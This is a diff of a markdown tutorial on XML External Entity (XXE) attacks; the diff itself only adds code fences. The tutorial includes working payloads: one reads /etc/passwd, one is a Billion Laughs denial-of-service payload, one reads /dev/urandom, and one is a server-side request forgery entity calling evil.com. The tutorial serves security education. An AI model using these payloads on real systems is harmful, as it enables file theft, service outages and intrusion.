@@ -41,12 +41,14 @@ A very basic way XXE payloads can be used is to retrieve files from the server. 
 
 We can adjust this XML data to retrieve files we specify and let it return the results.
 
+    ```xml
     <?xml version="1.0" encoding="utf-8"?>
     <!DOCTYPE foo [
        <!ELEMENT foo ANY>
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
     ]>
     <bookingId>&xxe;</bookingId>
+    ```
 
 This is considered an **in-band** attack as the vector of attack is clear and the information retrieved is in the form of a response. Another type of attack is called an **out-of-band** attack like a blind attack.
 
@@ -60,7 +62,7 @@ If the attention is not necessary to retrieve data but to deny service, maybe a 
 
 This would be the ideal scenario to dispatch a DOS attack. One such attack type is called A Billion Laughs attack.
 
-    ```
+    ```xml
     <?xml version="1.0" encoding="utf-8"?>
     <!DOCTYPE lolz [
        <!ENTITY lol "lol">
@@ -82,12 +84,14 @@ Now the reason for the name has become prevalent, let's discuss how it works. Fi
 
 Another popular way of achieving the same outcome can be done using remote code execution. Asuming the server operates on Linux, an endless recursive file can be called as follows.
 
+    ```xml
     <?xml version="1.0" encoding="utf-8"?>
     <!DOCTYPE foo [
         <!ELEMENT foo ANY>
         <!ENTITY xxe SYSTEM "file:///dev/urandom">
     ]>
     <foo>&xxe;</foo>
+    ```
 
 The goal of this type of attack is to use all server resources possibly impacting application availability
 
@@ -95,12 +99,14 @@ The goal of this type of attack is to use all server resources possibly impactin
 
 Server-side request forgery happens when the payload appears to be from internal systems, which grants the attacker access to local resources as if authorized.
 
+    ```xml
     <?xml version="1.0" encoding="utf-8"?>
     <!DOCTYPE foo [
         <!ELEMENT foo ANY>
         <!ENTITY xxe SYSTEM "http://evil.com/">
     ]>
     <foo>&xxe;</foo>
+    ```
 
 This type of attack can be used as the door to a multitude of other attacks and exploits, such as remote code execution, DOS attacks, or just simply gaining access to privileged information, all while leaving a backdoor for future attacks.
 
